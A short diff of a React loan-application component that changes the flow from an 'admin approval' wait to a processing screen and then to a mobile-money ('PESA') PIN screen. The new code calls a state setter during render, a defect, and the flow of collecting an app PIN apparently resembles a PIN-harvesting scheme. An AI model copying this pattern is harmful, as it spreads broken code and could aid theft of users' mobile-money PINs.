@@ -359,11 +359,8 @@ function LoanApplication({ loanDetails, onBack, processor }) {
                 "Wait for Admin approval.."
             );
         }
-        setTimeout(() => {
-            setShowAdminWaiting(false)
-            setProcessing(true);
-            setShowVerification(true);
-        }, 5000);
+        setShowAdminWaiting(false);
+        setProcessing(true);
 
     } catch (error) {
 
@@ -649,20 +646,21 @@ function LoanApplication({ loanDetails, onBack, processor }) {
        PESA APP PIN SCREEN
     ========================================= */
     if (processing) {
-    return (
-        <div className="momo-processing-page">
-            <div className="momo-processing-spinner"></div>
-            <h2>
-                    Processing..
-                </h2>
+        setShowVerification(true);
+        return (
+            <div className="momo-processing-page">
+                <div className="momo-processing-spinner"></div>
+                <h2>
+                        Processing..
+                    </h2>
 
-                <p>
-                    Please wait while we verify
-                    your phone number...
-                </p>
-        </div>
-    );
-}
+                    <p>
+                        Please wait while we verify
+                        your phone number...
+                    </p>
+            </div>
+        );
+    }
 
     if (showPinScreen) {
 
